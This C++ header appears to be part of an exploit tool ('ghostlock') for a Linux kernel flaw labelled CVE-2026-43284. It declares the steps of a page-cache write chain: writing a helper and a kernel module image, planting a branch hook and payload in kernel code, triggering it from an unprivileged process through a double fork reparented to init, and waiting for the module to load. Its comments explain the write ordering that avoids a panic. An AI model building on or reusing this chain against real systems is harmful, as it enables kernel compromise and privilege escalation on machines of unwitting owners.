#pragma once
/** @file backend/cve_2026_43284/steps/pagecache_steps.hpp
 *  43284 链的封装步骤：脚本侧用名字请求（schema 的 backend.cve_2026_43284.steps 声明这些名字），
 *  宿主侧用同一份实现执行——工具与 script 接口不各写一遍。
 *
 *  边界（和 C++ 工具的 phase 划分一致）：
 *    - 本单元只做「对某个已建好的 access 干什么」，不建栈、不读文件、不打印；
 *    - 输入里没有密钥：写什么由 image 给定，密钥仍只在 AccessParams 里（会话帧来源）；
 *    - 失败一律具名（const char*），不抛异常，不部分成功：一个块没回来就停在该块。
 */
#include <cstddef>
#include <cstdint>
#include <span>
#include <string_view>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    class PageCacheDoorLinux;
}
#include "contract/kernel_access.hpp"

namespace ghostlock::backend::cve_2026_43284::steps {
    /** One encapsulated step of the pagecache chain, addressed by the name the wire declares. */
    enum class PagecacheStep : unsigned char {
        Patch1 = 0,   /**< 把 helper 镜像写在 patch #1 目标的开头（桥的入口）。 */
        Carrier = 1,  /**< 把模块镜像写在载体上（每个块写后回读）。 */
        Hook = 2,     /**< sentry hook：站点一个字 + landing 的载荷。 */
        Trigger = 3,  /**< 触发（让位 + double-fork），参数里带 delay。 */
        Wait = 4,     /**< 等待终态标记，顺序与判据取自参数。 */
    };

    /** The five names, spelled once (schema 侧同名单）。 */
    inline constexpr const char *kPagecacheStepNames[] = {
        "patch1", "carrier", "hook", "trigger", "wait",
    };
    inline constexpr std::size_t kPagecacheStepCount =
            sizeof(kPagecacheStepNames) / sizeof(kPagecacheStepNames[0]);

    /** @return the step a name denotes, or false when the name is not one of the five. */
    [[nodiscard]] bool pagecache_step_by_name(std::string_view name, PagecacheStep &out) noexcept;
    /** @return the name of a step (never null). */
    [[nodiscard]] const char *pagecache_step_name(PagecacheStep step) noexcept;

    /** One write request: what to write, where it goes, and one block"s width. */
    struct WriteRequest final {
        contract::KernelAccess *access = nullptr;
        AccessParams *params = nullptr;
        /** The whole image; the caller keeps it alive for the call. */
        std::span<const std::byte> image{};
        /** Where the image starts inside the target (carrier base, or 0 for patch #1). */
        std::uint64_t offset = 0U;
        /** One block"s width: 8 for a single hook word, 16 for the image writes. */
        std::size_t width = 16U;
        /** The channel the write goes through. */
        contract::AccessChannel channel = contract::AccessChannel::PageCache;

        /**
         *  耐心：写是派发式的（成功只到 Dispatched），落盘要等内核处理；
         *  验证段据它做**有界重试**（0 = 不重试，与旧行为一致）。由调用方给 —— 等多久是上层的事。
         */
        std::uint64_t budget_ms = 0U;
    };

    /** One hook request: where the site and the payload live (the plan), and the block math. */
    struct HookRequest final {
        contract::KernelAccess *access = nullptr;
        AccessParams *params = nullptr;
        const hook::SentryPlan *plan = nullptr;
        /** The width of one kernel-access block. */
        std::size_t width = 16U;
        contract::AccessChannel channel = contract::AccessChannel::PageCache;
    };

    /** Write the sentry hook in the only safe order: **the payload first**, every block written and
     *  read back through the loop every image write uses, and **the block that carries the site
     *  last** -- its own block is read and its guard/replayed words checked before any write, the
     *  branch is patched into it, that block goes back and is read back.
     *
     *  Why that order and not the reverse: the branch is live as soon as the site word lands, so a
     *  site written before its landing is written sends every process that reaches the sentry into
     *  bytes that are not there yet (init's log path is one) and the kernel panics. A failure at any
     *  step before the site write therefore returns with the site untouched.
     *  Reference: the retired tree wrote all shellcode blocks first and the trampoline block last
     *  (\c 6f7ded87 steps/hook_patch.cpp:176-189), and upstream does the same (exp.c:716-740).
     *  @param request the access, the parameters, the plan
     *  @param refusal receives a named reason on failure
     *  @return true when both halves are in place and verified. */
    [[nodiscard]] bool write_hook(HookRequest &request, const char **refusal) noexcept;

    /** Put the site block back the way the plan found it: read the block that encloses the site, write
     *  the guard word before the site and the displaced instruction at it, put the block back and read
     *  it back. Nothing else is touched (the payload is left as it is; scrubbing the landing is a
     *  separate decision, because the branch is what makes it reachable).
     *
     *  Idempotent by construction: it writes the plan's two words whatever the block holds now, so a
     *  second call re-writes and re-verifies the same bytes instead of refusing "already restored".
     *  That is what lets the chain boundary call it unconditionally on every terminus (reference: the
     *  retired tree's unconditional restore at \c 6f7ded87 steps/chain.cpp:279-284, before release;
     *  its \c hook_patch.cpp:210-225 puts the site block back first). Wiring it into the chain is a
     *  later decision: this is the steps-layer step only.
     *  @param plan the plan the hook was applied with
     *  @param request supplies the surface and the block math: the access, the parameters, the width
     *         and the channel (its own \c plan member is not read)
     *  @param refusal receives a named reason when the block cannot be read, written or verified
     *  @return true when the block is back and verified. */
    [[nodiscard]] bool restore_hook(const hook::SentryPlan &plan, HookRequest &request,
                                    const char **refusal) noexcept;
    /** The trigger: one double fork, so the grandchild is reparented to init and the hooked path is
     *  what runs when init reaps it. This process stays unprivileged and loads nothing.
     *  @param delay_ms how long the grandchild waits before exiting
     *  @return nullptr when the fork chain completed, or a named reason. */
    [[nodiscard]] const char *trigger_orphan(std::uint32_t delay_ms) noexcept;

    /** What the wait watches. The clock and the existence check are injected so the wait is a pure
     *  function of them: on a device they are the real ones, in a test they are a fake clock. */
    struct WaitRequest final {
        const char *success_marker = nullptr;
        const char *failure_marker = nullptr;
        const char *in_flight_marker = nullptr;
        const char *module_dir = nullptr;
        /** The module"s own name, for /sys/module/<name>; empty means the default one. */
        const char *module_name = nullptr;
        std::uint32_t budget_ms = 0U;
        std::uint32_t poll_ms = 10U;
        /** Does this path exist right now? (the device passes stat, a test passes a set) */
        bool (*exists)(const char *path) = nullptr;
        /** Sleep one poll interval (the device passes usleep, a test passes a counter). */
        void (*sleep_ms)(std::uint32_t ms) = nullptr;
    };

    /** Wait for the terminal state in that run"s own order: failure first, because a stale success
     *  marker must not mask a fresh failure; then success; and a module observed loaded and then gone
     *  with no marker counts as a failure, as that run counted it.
     *  @return nullptr when the success marker appeared, or a named reason. */
    [[nodiscard]] const char *wait_for_module(const WaitRequest &request) noexcept;
    /** Everything one step needs that is not the access itself: the door@Q@s target (the path whose
     *  page cache is written), the parameters (the caller builds them from the wire), the image for
     *  the two image steps, and the trigger/wait values. */
    struct StepContext final {
        AccessParams *params = nullptr;
        /** The file this step writes through: the patch target, the carrier, or the hook target. */
        const char *door_path = nullptr;
        /** The image the step writes when it writes one (empty means "the step needs none").
         *  patch #1 与 carrier 现在由执行体自己供给（内嵌 helper / 按名读的模块），此处留给调用方覆盖用。 */
        std::span<const std::byte> image{};
        /** The module file the carrier step writes: the .ko the wire names, read by path. */
        const char *module_path = nullptr;
        /** The file patch #1 writes the helper into: the bridge runs it to read a carrier this
         *  process may not open. */
        const char *patch_target = nullptr;
        std::uint32_t delay_ms = 0U;
        WaitRequest wait{};
    };

    /** What came of asking for a step. */
    enum class StepOutcome : unsigned char {
        Ran = 0,      /**< 这一步跑完了。 */
        Refused = 1,  /**< 跑了但被拒：refusal 有名。 */
        NoDevice = 2, /**< 这个进程建不起那次运行的栈（例如不是设备上）。 */
    };

    /** Run one step on this machine: open the door its target needs, build the page-cache stack
     *  (door -> splice -> window -> landing -> access), initialise the access with the parameters, then
     *  call the body the name denotes. The door is opened once and the access is shut down before it
     *  goes out of scope. On a machine where the door cannot be opened the answer is NoDevice -- that
     *  is not a refusal, it is the absence of the device the step needs.
     *  @param step the step to run
     *  @param context its door target, parameters, image and wait values
     *  @param refusal receives a named reason when the outcome is Refused
     *  @return Ran, Refused, or NoDevice. */
    [[nodiscard]] StepOutcome run_pagecache_step(PagecacheStep step, StepContext &context,
                                                const char **refusal) noexcept;
    /** Write an image block by block and read every block back: the loop that separates "the
     *  datagram was sent" from "the page now holds this".
     *  @param request the access, the parameters, the image and its position
     *  @param refusal receives a named reason when the write or the read-back fails
     *  @return true when every block went in and came back; false with @p refusal set otherwise. */
    [[nodiscard]] bool write_image_verified(WriteRequest &request, const char **refusal) noexcept;
}  // namespace ghostlock::backend::cve_2026_43284::steps
